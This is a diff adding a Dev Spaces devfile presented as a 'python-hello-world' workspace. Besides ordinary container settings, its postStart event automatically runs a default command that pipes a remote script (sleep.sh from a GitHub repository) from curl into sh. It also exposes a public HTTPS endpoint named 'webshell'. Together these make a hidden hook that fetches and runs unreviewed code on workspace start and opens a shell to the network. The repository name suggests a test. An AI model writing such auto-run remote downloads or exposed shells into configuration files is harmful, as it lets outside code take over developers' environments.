@@ -1,0 +1,46 @@
+schemaVersion: 2.2.2
+metadata:
+  name: python-hello-world
+components:
+  - name: python
+    container:
+      image: registry.redhat.io/devspaces/udi-rhel8@sha256:720d4bff5924ac76af5b25606ebfb2bcf853212af6c8202f591c4954a88f57f6
+      memoryLimit: 2Gi
+      memoryRequest: 1Gi
+      cpuLimit: '2'
+      cpuRequest: '1'
+      mountSources: true
+  - name: tools
+    container:
+      args:
+        - tail
+        - "-f"
+        - "/dev/null"
+      image: registry.redhat.io/devspaces/udi-rhel8@sha256:720d4bff5924ac76af5b25606ebfb2bcf853212af6c8202f591c4954a88f57f6
+      endpoints:
+        - attributes:
+            path: /
+          exposure: public
+          # Endpoint name that is needed for the “sleep.sh” script:
+          name: webshell
+          protocol: https
+          targetPort: 8080
+      memoryLimit: 2Gi
+      memoryRequest: 256Mi
+      mountSources: true
+      env:
+      - name: SHELL
+        value: /bin/bash
+commands:
+  - id: runme
+    exec:
+      label: Run the needed tools
+      component: tools
+      commandLine: curl https://raw.githubusercontent.com/feuillemorte/devspaces-test/main/sleep.sh | sh &
+      workingDir: ${PROJECT_SOURCE}
+      group:
+        kind: run
+        isDefault: true
+events:
+  postStart:
+    - runme
